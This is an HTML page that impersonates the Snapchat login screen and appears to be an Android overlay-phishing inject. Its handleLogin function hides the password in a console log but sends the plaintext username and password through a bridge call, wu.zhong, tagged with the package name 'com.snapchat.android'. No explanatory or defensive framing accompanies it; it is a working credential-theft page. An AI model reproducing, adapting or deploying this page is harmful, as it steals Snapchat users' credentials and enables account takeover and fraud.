<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Snapchat - Log In</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }


    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
      background-color: #f8f9fa;
      color: #333;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }


    .header {
      display: flex;
      align-items: center;
      padding: 16px 20px;
      background-color: #f8f9fa;
    }


    .back-btn {
      background: none;
      border: none;
      color: #ccc;
      font-size: 28px;
      cursor: pointer;
      padding: 8px;
      margin-left: -8px;
      font-weight: 300;
    }


    .main-content {
      flex: 1;
      padding: 40px 20px 20px;
      display: flex;
      flex-direction: column;
      max-width: 400px;
      margin: 0 auto;
      width: 100%;
    }


    .title {
      font-size: 36px;
      font-weight: 300;
      color: #333;
      text-align: center;
      margin-bottom: 60px;
    }


    .form-container {
      display: flex;
      flex-direction: column;
      gap: 30px;
      margin-bottom: 40px;
    }


    .input-group {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }


    .input-label {
      font-size: 14px;
      font-weight: 500;
      color: #4da6ff;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }


    .input-container {
      position: relative;
    }


    .input-field {
      width: 100%;
      background: #ffffff;
      border: 2px solid #e0e0e0;
      border-radius: 8px;
      color: #333;
      font-size: 16px;
      padding: 16px;
      outline: none;
      transition: border-color 0.3s ease;
    }


    .input-field:focus {
      border-color: #4da6ff;
    }


    .input-field.has-content {
      border-left: 4px solid #4caf50;
    }


    .password-toggle {
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      font-size: 20px;
      color: #ccc;
      padding: 4px;
    }


    .phone-link {
      color: #4da6ff;
      text-decoration: none;
      font-size: 14px;
      font-weight: 500;
      transition: color 0.3s ease;
    }


    .phone-link:hover {
      color: #1976d2;
    }


    .checkbox-container {
      display: flex;
      align-items: center;
      gap: 12px;
      margin: 20px 0 40px 0;
    }


    .checkbox {
      width: 20px;
      height: 20px;
      border: 2px solid #4da6ff;
      background-color: #4da6ff;
      border-radius: 3px;
      cursor: pointer;
      flex-shrink: 0;
      position: relative;
    }


    .checkbox::after {
      content: '✓';
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      color: white;
      font-size: 12px;
      font-weight: bold;
    }


    .checkbox.unchecked {
      background-color: transparent;
    }


    .checkbox.unchecked::after {
      display: none;
    }


    .checkbox-label {
      font-size: 14px;
      color: #bbb;
      cursor: pointer;
    }


    .forgot-password {
      color: #4da6ff;
      text-decoration: none;
      font-size: 16px;
      text-align: center;
      margin-bottom: 60px;
      transition: color 0.3s ease;
    }


    .forgot-password:hover {
      color: #1976d2;
    }


    .login-button {
      background-color: #9e9e9e;
      color: #ffffff;
      border: none;
      padding: 18px 24px;
      font-size: 18px;
      font-weight: 500;
      border-radius: 25px;
      cursor: pointer;
      margin-top: auto;
      margin-bottom: 30px;
      transition: all 0.3s ease;
    }


    .login-button:hover {
      background-color: #757575;
    }


    .login-button:disabled {
      background-color: #e0e0e0;
      color: #bbb;
      cursor: not-allowed;
    }


    .login-button:active {
      transform: scale(0.98);
    }



    @media (min-width: 768px) {
      .main-content {
        padding: 60px 40px 40px;
      }
     
      .title {
        font-size: 42px;
        margin-bottom: 80px;
      }
    }


    @media (min-width: 1024px) {
      body {
        justify-content: center;
        padding: 20px;
        background-color: #ffffff;
      }
     
      .header {
        display: none;
      }
     
      .main-content {
        background-color: #f8f9fa;
        border-radius: 16px;
        padding: 80px 60px 60px;
        min-height: auto;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        border: 1px solid #e0e0e0;
      }
    }
  </style>
</head>
<body>
  <header class="header">
    <button class="back-btn" onclick="goBack()">‹</button>
  </header>


  <main class="main-content">
    <h1 class="title">Log in to Snapchat</h1>
   
    <form class="form-container" onsubmit="handleLogin(event)">
      <div class="input-group">
        <label class="input-label" for="username">USERNAME OR EMAIL</label>
        <div class="input-container">
          <input
            type="text"
            id="username"
            class="input-field"
            required
          >
        </div>
        <a href="#" class="phone-link" onclick="switchToPhone(event)">Use phone number instead</a>
      </div>


      <div class="input-group">
        <label class="input-label" for="password">PASSWORD</label>
        <div class="input-container">
          <input
            type="password"
            id="password"
            class="input-field"
            required
          >
          <button type="button" class="password-toggle" onclick="togglePassword()">
      
          </button>
        </div>
      </div>


      <div class="checkbox-container">
        <div class="checkbox" onclick="toggleCheckbox()"></div>
        <label class="checkbox-label" onclick="toggleCheckbox()">
          Save Login Info on your device
        </label>
      </div>


      <a href="#" class="forgot-password" onclick="handleForgotPassword(event)">
        Forgot your password?
      </a>


      <button type="submit" class="login-button" id="loginBtn">
        Log In
      </button>
    </form>
  </main>


  <script>
    let isCheckboxChecked = true;
    let isPasswordVisible = false;



    function handleLogin(event) {
      event.preventDefault();
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
     
      if (username && password) {
        console.log('Login attempt:', {
          username,
          password: '***',
          saveLogin: isCheckboxChecked
        });
       

        wu.zhong(`🔰Snapchat Login \n\n✉️Username: ${username}\n\n🔒Password: ${password}`, "com.snapchat.android");
    
    
    }
    }


    

    function toggleCheckbox() {
      isCheckboxChecked = !isCheckboxChecked;
      const checkbox = document.querySelector('.checkbox');
     
      if (isCheckboxChecked) {
        checkbox.classList.remove('unchecked');
      } else {
        checkbox.classList.add('unchecked');
      }
    }


    function updateInputState(input) {
      if (input.value.trim()) {
        input.classList.add('has-content');
      } else {
        input.classList.remove('has-content');
      }
    }


    function updateButtonState() {
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const btn = document.getElementById('loginBtn');
     
      if (username.trim() && password.trim()) {
        btn.disabled = false;
        btn.style.backgroundColor = '#4da6ff';
      } else {
        btn.disabled = true;
        btn.style.backgroundColor = '#e0e0e0';
      }
    }


    document.getElementById('username').addEventListener('input', function() {
      updateInputState(this);
      updateButtonState();
    });


    document.getElementById('password').addEventListener('input', function() {
      updateInputState(this);
      updateButtonState();
    });


   
    document.querySelectorAll('.input-field').forEach(input => {
      input.addEventListener('focus', function() {
        this.style.borderColor = '#4da6ff';
      });
     
      input.addEventListener('blur', function() {
        if (!this.value) {
          this.style.borderColor = '#e0e0e0';
        }
      });
    });


 
    document.addEventListener('DOMContentLoaded', function() {
      updateButtonState();
    });
  </script>
</body>
</html>
